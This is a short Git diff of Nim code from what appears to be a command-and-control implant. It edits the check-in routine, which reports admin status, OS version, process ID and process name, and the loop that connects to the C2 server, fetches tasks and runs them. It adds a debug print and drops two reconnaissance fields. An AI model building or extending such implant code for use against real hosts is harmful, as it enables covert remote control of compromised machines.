@@ -51,8 +51,6 @@ proc handleTask(app: App, jsonNode: JsonNode) =
       isAdmin=areWeAdmin(),
       osType=osType,
       windowsVersionInfo=getwindowosinfo(),
-      linuxVersionInfo=getlinuxosinfo(),
-      ownIntegrity=getintegrity(),
       pid=getCurrentProcessId(),
       pname=getAppFilename()
     )
@@ -63,7 +61,7 @@ proc handleTask(app: App, jsonNode: JsonNode) =
     let taskOutput = newTaskOutput(taskId)
     var taskNames: seq[tuple[name: string]] = @[(name: "enumtasks"), (name: "sleep")]
     for task in tasks: taskNames.add (name: task.name)
-    taskOutput.addData(Object, "tasks", $(toJson taskNames))
+    taskOutput.data = $(toJson taskNames)
     app.sendOutput(taskOutput)
   else:
     var foundTask = false
@@ -78,6 +76,7 @@ proc receiveCommands(app: App) =
   app.connectToC2()
   while true:
     let tasks = app.fetchTasks()
+    echo $tasks
     if tasks.kind == JArray:
       for task in tasks:
         handleTask app, task
